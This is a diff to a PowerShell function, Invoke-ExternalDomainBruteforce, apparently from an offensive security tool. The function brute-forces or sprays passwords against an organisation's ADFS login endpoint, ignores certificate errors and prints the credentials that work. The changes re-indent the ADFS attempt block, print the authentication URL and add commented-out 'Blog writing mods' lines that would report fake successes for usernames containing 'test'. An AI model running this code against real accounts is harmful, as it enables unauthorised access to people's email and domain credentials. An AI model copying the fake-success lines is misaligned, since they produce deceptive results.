@@ -176,6 +176,10 @@ function Invoke-ExternalDomainBruteforce{
 			}
 
 			catch{
+				# Blog writing mods
+				# if($user -match 'test'){Write-Host "Authentication Successful: `t'$User' - "$password -ForegroundColor Green;$EmailTestResults.Rows.Add($User, "N/A", $password) | Out-Null;$LastSuccessAuth = $User}
+				# else{Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red}
+				
 				Write-Host "Authentication Failure: `t'$User' - "$password -ForegroundColor Red
 			}
 		}
@@ -190,29 +194,36 @@ function Invoke-ExternalDomainBruteforce{
 		
             $user = $_
 
-			# Check if Invoke-ADFSSecurityTokenRequest is loaded
-			try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
-			catch{Write-Host `n'*Requires the command imported from here - https://gallery.technet.microsoft.com/scriptcenter/Invoke-ADFSSecurityTokenReq-09e9c90c' -ForegroundColor Red;break
-			}
+		# Check if Invoke-ADFSSecurityTokenRequest is loaded
+		try {Get-Command -Name Invoke-ADFSSecurityTokenRequest -ErrorAction Stop | Out-Null}
+		catch{Write-Host `n'*Requires the command imported from here - https://gallery.technet.microsoft.com/scriptcenter/Invoke-ADFSSecurityTokenReq-09e9c90c' -ForegroundColor Red;break
+		}
+		
+		# Parse the JSON URI into usable formats
+		$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
+		$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
+		
+		Write-Verbose "Testing $($User) with password $($password)"
+		
+		# Attempt to request a security token using username/password
+		try{
+                	$ErrorActionPreference = "Stop";
+                	Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
+                	$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
+                	Write-Host 'Authentication Successful: '$info[0]\$user' - '$password -ForegroundColor Green
+            	}
+            	catch{
+			# Blog writing mods
+			# if($user -match 'test'){Write-Host 'Authentication Successful: '$info[0]\$user' - '$password -ForegroundColor Green;$EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null}
+                	#else{Write-Host 'Authentication Failure: '$info[0]\$user' - '$password -ForegroundColor Red}
+				
+			Write-Host 'Authentication Failure: '$info[0]\$user' - '$password -ForegroundColor Red
+            	}
 			
-			# Parse the JSON URI into usable formats
-			$ADFSBaseUri = [string]$info[3].Split("/")[0]+"//"+[string]$info[3].Split("/")[2]+"/"
-			$AppliesTo = $ADFSBaseUri+"adfs/services/trust/13/usernamemixed"
 			
-			Write-Verbose "Testing $($User) with password $($password)"
-			
-			# Attempt to request a security token using username/password
-            try{
-                $ErrorActionPreference = "Stop";
-                Invoke-ADFSSecurityTokenRequest -ClientCredentialType UserName -ADFSBaseUri "$ADFSBaseUri" -AppliesTo "$AppliesTo" -UserName "$user" -Password $password -Domain '$info[0]' -OutputType Token -SAMLVersion 2 -IgnoreCertificateErrors | Out-Null
-                $EmailTestResults.Rows.Add($user, $domain, $password) | Out-Null
-                Write-Host 'Authentication Successful: '$info[0]\$user' - '$password -ForegroundColor Green
-            }
-            catch{
-                Write-Host 'Authentication Failure: '$info[0]\$user' - '$password -ForegroundColor Red
-            }
 
 		}
+		Write-Host "`nAuthentication URL: "$info[3] -ForegroundColor Green
 	}
 
 	ElseIf($info[1] -eq "NA"){
